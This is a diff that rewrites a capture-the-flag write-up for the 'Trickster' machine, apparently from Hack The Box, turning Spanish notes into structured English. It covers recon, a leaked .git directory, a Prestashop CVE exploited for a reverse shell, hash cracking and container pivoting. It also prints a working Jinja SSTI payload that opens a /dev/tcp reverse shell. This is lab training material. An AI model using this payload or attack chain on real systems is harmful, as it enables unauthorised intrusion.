@@ -7,6 +7,158 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Trickster</h1><br/><p>Realizo un escaneo de puertos</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN trickster_scan &lt;IP_target&gt;</strong></p><p></p><p>Puertos 22 (SSH) y 80 (HTTP) abiertos</p><p></p><p>Subdominio encontrado <a href="http://shop.trickster.htb/">http://shop.trickster.htb/</a></p><p></p><p>Encuentro un login</p><p></p><p><img src="images/131-1.png" alt="images/131-1.png" /></p><p></p><p>Con un <strong>whatweb</strong> obtengo la versión de Apache<strong> Apache[2.4.52]</strong></p><p></p><p>Puedo crear una cuenta</p><p></p><p><img src="images/131-2.png" alt="images/131-2.png" /></p><p></p><p>Encuentro el directorio <a href="http://shop.trickster.htb/.git/">http://shop.trickster.htb/.git/</a></p><p></p><p>En config encuentro al usuario admin</p><p></p><p><img src="images/131-3.png" alt="images/131-3.png" /></p><p></p><p>En los logs encuentro que se hizo un commit del admin_panel</p><p></p><p>	<strong>0000000000000000000000000000000000000000 0cbc7831c1104f1fb0948ba46f75f1666e18e64c adam &lt;adam@trickster.htb&gt; 1716538399 -0400	commit (initial): update admin pannel</strong></p><p></p><p>Con Git_dumper puedo ver el commit que se hizo</p><p></p><p>Este es el hash de dicho commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c</p><p></p><p>Parece que tiene una vuln File Upload</p><p></p><p>Si selecciono un productp puedo ver una coockie con Burp</p><p></p><p><img src="images/131-4.png" alt="images/131-4.png" /></p><p></p><p>Tambien me menciona <strong>Prestashop</strong></p><p></p><p>Encuentro este directorio <a href="http://shop.trickster.htb/admin634ewutrx1jgitlooaj">http://shop.trickster.htb/admin634ewutrx1jgitlooaj</a></p><p></p><p>Esto me lleva a otro login de Prestashop con versión <strong>Prestashop  8.1.5</strong></p><p></p><p><img src="images/131-5.png" alt="images/131-5.png" /></p><p></p><p>Encuentro el archivo robots.txt pero no aporta nada de info</p><p></p><p>Encuentro que existe un archivo <strong>admin634ewutrx1jgitlooaj/filemanager/force_download.ph</strong></p><p></p><p>Encuentro un XSS <strong>CVE-2024-34716</strong></p><p></p><p><img src="images/131-6.png" alt="images/131-6.png" /></p><p></p><p>Obtengo el reverse shell</p><p></p><p>en <strong>./var/www/prestashop/app/config/parameters.php</strong> obtengo unas creds</p><p></p><p>	<strong><h3>mysql -h 127.0.0.1 -u ps_user -p prestashop</h3></strong></p><p>	</p><p>	<strong><h3>prest@shop_o</h3></strong></p><p>	</p><p><strong>	select * from ps_employee;</strong></p><p>	</p><p>Obtengo las creds del usuario james</p><p>	</p><p><strong>	james --&gt; $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm</strong></p><p></p><p>	<strong>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</strong></p><p></p><p><img src="images/131-7.png" alt="images/131-7.png" /></p><p></p><p>accedo a través de SSH</p><p></p><p><img src="images/131-8.png" alt="images/131-8.png" /></p><p></p><p>Hay 2 Users mas</p><p></p><p><img src="images/131-9.png" alt="images/131-9.png" /></p><p></p><p>Subo el archivo linpeas.sh y le cambio los permisos con chmod 755 linpeas.sh para poder ejecutarlo</p><p></p><p>Encuentro esta script ejecutada como runner </p><p></p><p>	<strong>runner      1243  0.0  0.6  33660 24520 ?        Ss   Sep23   0:16 /usr/bin/python3 /home/runner/prestashop/AutoVisitAttach.py</strong></p><p></p><p>Puertos activos</p><p></p><p><img src="images/131-10.png" alt="images/131-10.png" /></p><p></p><p>Puede que por prusaslicer</p><p></p><p><img src="images/131-11.png" alt="images/131-11.png" /></p><p></p><p>Puede que con tenga Arbitrary File Upload <a href="https://www.exploit-db.com/exploits/51983">PrusaSlicer 2.6.1 - Arbitrary code execution - Multiple local Exploit (exploit-db.com)</a></p><p></p><p>Parece que hay un contenedor de docker</p><p></p><p><img src="images/131-12.png" alt="images/131-12.png" /></p><p></p><p>Hago un portforwarding</p><p></p><p>	<strong>ssh -L 5000:172.17.0.2:5000 james@trickster.htb</strong></p><p></p><p>Con este codigo puedo poner el reverse shell</p><p>	</p><p>	<strong>get://ip/lone</strong> → BLIND SSTI (Server Site Template Injection)</p><p></p><p>	<strong>{% for x in ().__class__.__base__.__subclasses__() %}</strong><strong></strong></p><p><strong>	{% if &quot;warning&quot; in x.__name__ %}</strong><strong></strong></p><p><strong>	{{ x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/9999 0&gt;&amp;1&#39;&quot;).read() }}</strong><strong></strong></p><p><strong>	{% endif %}</strong><strong></strong></p><p><strong>	{% endfor %}</strong></p><p></p><p>Obtengo el shell como root</p><p></p><p><img src="images/131-13.png" alt="images/131-13.png" /></p><p></p><p>En el historial de bash encuentro una password</p><p></p><p><img src="images/131-14.png" alt="images/131-14.png" /></p><p></p><p>Con esta pass la reuso para entrar como root en la maquina</p><p></p><p><img src="images/131-15.png" alt="images/131-15.png" /></p></div>
+  <div class="page">
+    <h1 class="title">Trickster</h1>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>
+        I begin with a full TCP port scan to identify exposed services on the target host.
+      </p>
+      <pre><code>nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN trickster_scan &lt;IP_target&gt;</code></pre>
+      <p>
+        The scan reveals two open ports: 22 running SSH and 80 serving HTTP content.
+        While enumerating the web service, I discover a virtual host configured as
+        <a href="http://shop.trickster.htb/">http://shop.trickster.htb/</a>.
+      </p>
+      <p>
+        Navigating to this subdomain, I identify a login panel exposed on the application.
+      </p>
+      <img src="images/131-1.png" alt="images/131-1.png" />
+      <p>
+        Using <strong>whatweb</strong>, I gather additional information about the web stack and confirm
+        that the server is running Apache version <strong>2.4.52</strong>.
+      </p>
+      <p>
+        The application allows user registration, which provides a foothold for further interaction
+        with the platform.
+      </p>
+      <img src="images/131-2.png" alt="images/131-2.png" />
+    </section>
+
+    <section>
+      <h2>Enumeration / Analysis</h2>
+      <p>
+        While exploring the application directories, I discover that the <strong>.git</strong> directory
+        is publicly accessible at
+        <a href="http://shop.trickster.htb/.git/">http://shop.trickster.htb/.git/</a>.
+      </p>
+      <p>
+        Inspecting the Git configuration files, I identify a user named <strong>admin</strong>.
+      </p>
+      <img src="images/131-3.png" alt="images/131-3.png" />
+      <p>
+        Reviewing the Git logs reveals that an administrative panel was committed by the admin user.
+        The commit message and hash provide valuable insight into recent changes.
+      </p>
+      <pre><code>0000000000000000000000000000000000000000 0cbc7831c1104f1fb0948ba46f75f1666e18e64c adam &lt;adam@trickster.htb&gt; 1716538399 -0400 commit (initial): update admin pannel</code></pre>
+      <p>
+        Using GitDumper, I extract the repository contents and analyze the commit with hash
+        <strong>0cbc7831c1104f1fb0948ba46f75f1666e18e64c</strong>. The code suggests the presence of a
+        file upload vulnerability.
+      </p>
+      <p>
+        When selecting a product, I intercept the request with Burp Suite and observe application cookies,
+        confirming backend behavior tied to the shop functionality.
+      </p>
+      <img src="images/131-4.png" alt="images/131-4.png" />
+      <p>
+        The application clearly references <strong>Prestashop</strong>. Further directory enumeration
+        leads me to an exposed administrative path at
+        <a href="http://shop.trickster.htb/admin634ewutrx1jgitlooaj">http://shop.trickster.htb/admin634ewutrx1jgitlooaj</a>.
+      </p>
+      <p>
+        This endpoint redirects to a Prestashop administrator login panel, confirming the version in use
+        as <strong>Prestashop 8.1.5</strong>.
+      </p>
+      <img src="images/131-5.png" alt="images/131-5.png" />
+      <p>
+        Although the <strong>robots.txt</strong> file is accessible, it does not disclose any useful information.
+        However, I identify a file manager endpoint located at
+        <strong>admin634ewutrx1jgitlooaj/filemanager/force_download.ph</strong>.
+      </p>
+      <p>
+        Further testing reveals a reflected XSS vulnerability, tracked as <strong>CVE-2024-34716</strong>.
+      </p>
+      <img src="images/131-6.png" alt="images/131-6.png" />
+    </section>
+
+    <section>
+      <h2>Exploitation</h2>
+      <p>
+        By leveraging the identified vulnerability, I am able to obtain a reverse shell on the target system.
+        Once inside, I locate the Prestashop configuration file at
+        <strong>/var/www/prestashop/app/config/parameters.php</strong>, which contains database credentials.
+      </p>
+      <pre><code>mysql -h 127.0.0.1 -u ps_user -p prestashop</code></pre>
+      <pre><code>prest@shop_o</code></pre>
+      <pre><code>select * from ps_employee;</code></pre>
+      <p>
+        Querying the database reveals credentials for the user <strong>james</strong>, including a bcrypt password hash.
+      </p>
+      <pre><code>james --&gt; $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm</code></pre>
+      <p>
+        I crack the hash using John the Ripper and the rockyou wordlist.
+      </p>
+      <pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+      <img src="images/131-7.png" alt="images/131-7.png" />
+      <p>
+        With valid credentials obtained, I authenticate via SSH as the james user.
+      </p>
+      <img src="images/131-8.png" alt="images/131-8.png" />
+      <p>
+        Enumerating the system reveals the presence of two additional user accounts.
+      </p>
+      <img src="images/131-9.png" alt="images/131-9.png" />
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        To continue enumeration, I upload <strong>linpeas.sh</strong> to the target and adjust its permissions
+        to allow execution.
+      </p>
+      <p>
+        LinPEAS highlights a Python script running under the <strong>runner</strong> user.
+      </p>
+      <pre><code>runner 1243 0.0 0.6 33660 24520 ? Ss Sep23 0:16 /usr/bin/python3 /home/runner/prestashop/AutoVisitAttach.py</code></pre>
+      <p>
+        I also observe multiple active ports and identify potential services related to PrusaSlicer.
+      </p>
+      <img src="images/131-10.png" alt="images/131-10.png" />
+      <img src="images/131-11.png" alt="images/131-11.png" />
+      <p>
+        Research suggests that PrusaSlicer 2.6.1 may be vulnerable to arbitrary code execution via file upload.
+        Additionally, I identify the presence of a Docker container.
+      </p>
+      <img src="images/131-12.png" alt="images/131-12.png" />
+      <p>
+        I perform SSH port forwarding to access the service running inside the container.
+      </p>
+      <pre><code>ssh -L 5000:172.17.0.2:5000 james@trickster.htb</code></pre>
+      <p>
+        The exposed service is vulnerable to a blind Server-Side Template Injection, which allows remote code execution.
+        I use the following payload to spawn a reverse shell.
+      </p>
+      <pre><code>{% for x in ().__class__.__base__.__subclasses__() %}
+{% if "warning" in x.__name__ %}
+{{ x()._module.__builtins__['__import__']('os').popen("/bin/bash -c '/bin/bash -i >& /dev/tcp/&lt;IP&gt;/9999 0>&1'").read() }}
+{% endif %}
+{% endfor %}</code></pre>
+      <p>
+        This grants me a shell as root inside the container.
+      </p>
+      <img src="images/131-13.png" alt="images/131-13.png" />
+      <p>
+        Inspecting the bash history reveals a plaintext password.
+      </p>
+      <img src="images/131-14.png" alt="images/131-14.png" />
+      <p>
+        I reuse these credentials to authenticate as root on the host system, completing the privilege escalation.
+      </p>
+      <img src="images/131-15.png" alt="images/131-15.png" />
+    </section>
+  </div>
 </body>
+
 </html>
